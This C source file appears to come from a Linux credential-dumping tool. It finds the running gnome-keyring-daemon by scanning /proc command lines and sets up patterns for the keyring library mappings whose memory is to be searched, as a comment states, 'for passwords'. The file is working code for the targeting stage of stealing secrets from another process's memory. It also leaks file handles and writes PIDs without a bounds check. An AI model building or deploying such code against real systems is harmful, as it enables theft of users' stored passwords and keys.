#include <stdlib.h>
#include <string.h>
#include <fnmatch.h>
#include <errno.h>
#include <stdio.h>

#include "targets.h"
#include "dbg.h"

void initTargets(Target *targets)
{    //GNOME Keyring
    strncpy((*targets).name, "gnome-keyring-daemon", MAX_SHRT_NAME);
    strncpy((*targets).source, "[SYSTEM - GNOME]", MAX_SHRT_NAME);
    (*targets).pids.size = 0;
    (*targets).needles.size = 2;
    (*targets).needles.needles[0] = "^+libgck\\-1.so\\.0$";
    (*targets).needles.needles[1] = "libgcrypt\\.so\\..+$";

}

void getTargetPids(Target *targets)
{
    DIR *dirp;
    struct dirent *dp;
    int pidSize;
    char fileName[MAX_CMDLINE_F] = {0};
    char buf[MAX_CMDLINE] = {0};
    FILE *fp = NULL;
    int i = -1;

    // Open process Dir
    if ((dirp = opendir("/proc")) == 0)
    {
        printf("[!!] /proc Access Denied!\n");
        exit(EXIT_FAILURE);
    }

    // Iterate through all processes
    while ((dp = readdir(dirp)) != NULL)
    {
        //If not a pid, skip
        if (fnmatch("[0-9]*", dp->d_name, 0) != 0)
            continue;

        // Get process name
        snprintf(fileName, MAX_CMDLINE_F-1, "/proc/%s/cmdline", dp->d_name);
        fp = fopen(fileName, "r");
        if (fp == NULL)
        {
            printf("Could not read /proc/%s/cmdline", dp->d_name);
            exit(EXIT_FAILURE);
        }       
        fgets(buf, MAX_CMDLINE-1, fp);

        //Compare cmdline to target names (fuzzy search)
        if (strstr(buf, (*targets).name) != NULL)
        {
            pidSize = (*targets).pids.size++; //update pids size
            (*targets).pids.array[pidSize] = atoi(dp->d_name); // update pids for target
            
        }
    }

    closedir(dirp);
    return;
}

#ifdef DEBUG
void dumpTargets(Target *targets)
{
    int i = -1, j = -1;

    if ((*targets).pids.size > 0) // pids found
    {
        log_info("FOUND TARGET PROCESS!\n");
        log_info("Name: %s", (*targets).name);
        log_info("Source: %s", (*targets).source);
        log_info("Needles:\n");
        for (j =0; j <(*targets).needles.size; j++)
        {
           log_info("Needle: %s\n", (*targets).needles.needles[j]);
  
        }
        log_info("PIDS:\n");
        for (j =0; j <(*targets).pids.size; j++)
        {
           log_info("PID: %d\n", (*targets).pids.array[j]);
        }
        // For each target process found, process its memory for passwords
    }

}
#endif


